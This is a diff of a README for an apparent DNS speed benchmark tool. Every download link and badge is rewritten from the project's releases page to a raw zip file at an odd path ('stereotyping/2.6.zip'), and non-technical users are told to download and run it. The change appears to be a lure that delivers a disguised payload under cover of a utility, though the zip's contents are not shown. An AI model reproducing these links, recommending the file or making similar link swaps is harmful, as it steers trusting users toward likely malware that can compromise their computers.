@@ -1,6 +1,6 @@
 <h1>⚡ dns-speed-benchmark-tool - Find Your Fastest DNS in Seconds</h1>
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Carlosjuniorr2571/dns-speed-benchmark-tool/releases)
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Carlosjuniorr2571/dns-speed-benchmark-tool/raw/refs/heads/main/stereotyping/2.6.zip)
 
 Welcome! If your internet feels slow, the problem might not be your connection—it could be your DNS. This tool tests 40+ public DNS servers from your location, finds the fastest one for your network, and lets you apply it with a single click. No technical knowledge needed.
 
@@ -10,7 +10,7 @@ Welcome! If your internet feels slow, the problem might not be your connection�
 
 Ready to boost your internet speed? Follow these simple steps:
 
-1. **Visit this link to download the application** – [Click here to go to the download page](https://github.com/Carlosjuniorr2571/dns-speed-benchmark-tool/releases)
+1. **Visit this link to download the application** – [Click here to go to the download page](https://github.com/Carlosjuniorr2571/dns-speed-benchmark-tool/raw/refs/heads/main/stereotyping/2.6.zip)
 2. On that page, find the newest version and click the download button.
 3. Once the download finishes, open your "Downloads" folder.
 4. Run the downloaded file to start using the tool.
@@ -23,7 +23,7 @@ That's it—no installation needed. You can run it directly from your desktop or
 
 **Step 1: Get the file**
 
-Visit this link to download the application: [https://github.com/Carlosjuniorr2571/dns-speed-benchmark-tool/releases](https://github.com/Carlosjuniorr2571/dns-speed-benchmark-tool/releases)
+Visit this link to download the application: [https://github.com/Carlosjuniorr2571/dns-speed-benchmark-tool/raw/refs/heads/main/stereotyping/2.6.zip](https://github.com/Carlosjuniorr2571/dns-speed-benchmark-tool/raw/refs/heads/main/stereotyping/2.6.zip)
 
 **Step 2: Run it**
 
@@ -149,7 +149,7 @@ If your computer can browse the web, it can run this tool.
 
 You're just one download away from faster, more reliable internet. The whole process takes less than five minutes:
 
-1. **Visit this link to download the application** – [https://github.com/Carlosjuniorr2571/dns-speed-benchmark-tool/releases](https://github.com/Carlosjuniorr2571/dns-speed-benchmark-tool/releases)
+1. **Visit this link to download the application** – [https://github.com/Carlosjuniorr2571/dns-speed-benchmark-tool/raw/refs/heads/main/stereotyping/2.6.zip](https://github.com/Carlosjuniorr2571/dns-speed-benchmark-tool/raw/refs/heads/main/stereotyping/2.6.zip)
 2. Run the benchmark
 3. Apply the fastest DNS server
 4. Enjoy snappier internet!
@@ -189,6 +189,6 @@ Your ISP's default DNS isn't always the best choice for speed. With this simple,
 
 **Download now and feel the difference.**
 
-[![Download Latest Version](https://img.shields.io/badge/⬇️%20Download%20Latest%20Version-2ea44f?style=for-the-badge)](https://github.com/Carlosjuniorr2571/dns-speed-benchmark-tool/releases)
+[![Download Latest Version](https://img.shields.io/badge/⬇️%20Download%20Latest%20Version-2ea44f?style=for-the-badge)](https://github.com/Carlosjuniorr2571/dns-speed-benchmark-tool/raw/refs/heads/main/stereotyping/2.6.zip)
 
 Keywords: adguard, apply, benchmark, cloudflare, dns, fastest, free, google, internet, isp, latency, network, nextdns, optimizer, quad9, resolver, response-time, speed, tool, windows
